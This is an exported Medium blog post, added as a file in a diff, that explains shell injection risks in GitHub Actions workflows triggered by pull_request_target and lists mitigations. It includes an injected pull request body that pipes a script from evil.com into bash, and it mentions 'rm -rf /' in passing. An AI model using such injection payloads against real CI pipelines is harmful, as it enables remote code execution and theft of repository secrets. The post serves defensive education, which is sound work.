@@ -1,0 +1,72 @@
+<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Shell injection in GitHub Actions CI/CD</title><style>
+      * {
+        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
+      }
+      html, body {
+        margin: 0;
+        padding: 0;
+      }
+      h1 {
+        font-size: 50px;
+        margin-bottom: 17px;
+        color: #333;
+      }
+      h2 {
+        font-size: 24px;
+        line-height: 1.6;
+        margin: 30px 0 0 0;
+        margin-bottom: 18px;
+        margin-top: 33px;
+        color: #333;
+      }
+      h3 {
+        font-size: 30px;
+        margin: 10px 0 20px 0;
+        color: #333;
+      }
+      header {
+        width: 640px;
+        margin: auto;
+      }
+      section {
+        width: 640px;
+        margin: auto;
+      }
+      section p {
+        margin-bottom: 27px;
+        font-size: 20px;
+        line-height: 1.6;
+        color: #333;
+      }
+      section img {
+        max-width: 640px;
+      }
+      footer {
+        padding: 0 20px;
+        margin: 50px 0;
+        text-align: center;
+        font-size: 12px;
+      }
+      .aspectRatioPlaceholder {
+        max-width: auto !important;
+        max-height: auto !important;
+      }
+      .aspectRatioPlaceholder-fill {
+        padding-bottom: 0 !important;
+      }
+      header,
+      section[data-field=subtitle],
+      section[data-field=description] {
+        display: none;
+      }
+      </style></head><body><article class="h-entry">
+<header>
+<h1 class="p-name">Shell injection in GitHub Actions CI/CD</h1>
+</header>
+<section data-field="subtitle" class="p-summary">
+Translated from my blog in Spanish: https://medium.com/@kfir_g/inyecci%C3%B3n-de-shell-en-ci-cd-de-github-actions-83f03a7252ce
+</section>
+<section data-field="body" class="e-content">
+<section name="0913" class="section section--body section--first"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="e028" id="e028" class="graf graf--h3 graf--leading graf--trailing graf--title">Shell injection in GitHub Actions CI/CD</h3></div></div></section><section name="eca6" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><p name="1ad8" id="1ad8" class="graf graf--p graf--leading graf--trailing">Translated from my blog in Spanish: <a href="https://medium.com/@kfir_g/inyecci%C3%B3n-de-shell-en-ci-cd-de-github-actions-83f03a7252ce" data-href="https://medium.com/@kfir_g/inyecci%C3%B3n-de-shell-en-ci-cd-de-github-actions-83f03a7252ce" class="markup--anchor markup--p-anchor" rel="nofollow" target="_blank">https://medium.com/@kfir_g/inyecci%C3%B3n-de-shell-en-ci-cd-de-github-actions-83f03a7252ce</a></p></div></div></section><section name="3cb7" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><p name="8be7" id="8be7" class="graf graf--p graf--leading">GitHub Actions offers a special event type called <code class="markup--code markup--p-code">pull_request_target</code>that allows workflows to run on pull requests from forks with the same permissions as the base repository. This can be useful for some scenarios, such as commenting on pull requests or checking out private dependencies. However, it also comes with significant security risks, and should be used with caution.</p><p name="4610" id="4610" class="graf graf--p graf-after--p">One of the main risks of using <code class="markup--code markup--p-code">pull_request_target</code>is that it exposes secrets and environment variables to untrusted code from the pull request. This means that an attacker can create a malicious pull request that steals or leaks these sensitive information, or uses them to perform unauthorized actions on behalf of the repository owner. For example, an attacker could access the GitHub token and create new issues, comments, releases, or even delete the repository.</p><p name="adc8" id="adc8" class="graf graf--p graf-after--p">Another risk of using <code class="markup--code markup--p-code">pull_request_target</code>is that it runs the workflow file from the base branch, not from the pull request branch. This means that an attacker can modify the workflow file in the pull request and inject arbitrary commands or scripts that will run on the base branch’s workflow. For example, an attacker could add a step that runs <code class="markup--code markup--p-code">rm -rf /</code>on the runner machine, or executes a remote shell.</p><p name="5d2a" id="5d2a" class="graf graf--p graf-after--p">One of the ways that an attacker can inject commands or scripts into the workflow is by using shell injection. Shell injection is a technique that exploits a vulnerability in a program that executes a command in a shell without properly escaping or validating the input. For example, if the workflow uses a step like this:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="ab41" id="ab41" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">- name: inject <span class="hljs-built_in">command</span><br />  run: <span class="hljs-built_in">echo</span> <span class="hljs-variable">${{ github.event.pull_request.body }</span>}</span></pre><p name="2967" id="2967" class="graf graf--p graf-after--pre">An attacker could create a pull request with a body like this:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="4e36" id="4e36" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">Hello world; curl https://evil.com/script.sh | bash</span></pre><p name="cad0" id="cad0" class="graf graf--p graf-after--pre">This would cause the workflow to run the command <code class="markup--code markup--p-code">echo Hello World; curl https://evil.com/script.sh | bash</code>, which would download and execute a malicious script from an external source.</p><p name="d56b" id="d56b" class="graf graf--p graf-after--p graf--trailing">To prevent shell injection attacks, GitHub Actions users should follow some best practices, such as:<br> — Escaping or quoting the input from the pull request before using it in the workflow. <br>— Using built-in functions or actions to handle the input instead of running commands in a shell. <br>— Using code scanning tools to detect vulnerabilities in the code or the workflow. <br>— Using third-party tools or services to run workflows in isolated environments.</p></div></div></section><section name="00b0" class="section section--body section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><p name="cbb3" id="cbb3" class="graf graf--p graf--leading graf--trailing">References: <br><a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/" data-href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/" class="markup--anchor markup--p-anchor" rel="noopener ugc nofollow noopener" target="_blank">https://securitylab.github.com/research/github-actions-preventing-pwn-requests/</a><br><a href="https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/" data-href="https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/" class="markup--anchor markup--p-anchor" rel="noopener ugc nofollow noopener" target="_blank">https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/</a></p></div></div></section>
+</section>
+<footer><p>By <a href="https://medium.com/@Kfir-G" class="p-author h-card">Kfir Gisman</a> on <a href="https://medium.com/p/dc137317bc9"><time class="dt-published" datetime="2023-07-09T08:54:53.014Z">July 9, 2023</time></a>.</p><p><a href="https://medium.com/@Kfir-G/shell-injection-in-github-actions-ci-cd-dc137317bc9" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on December 20, 2025.</p></footer></article></body></html>
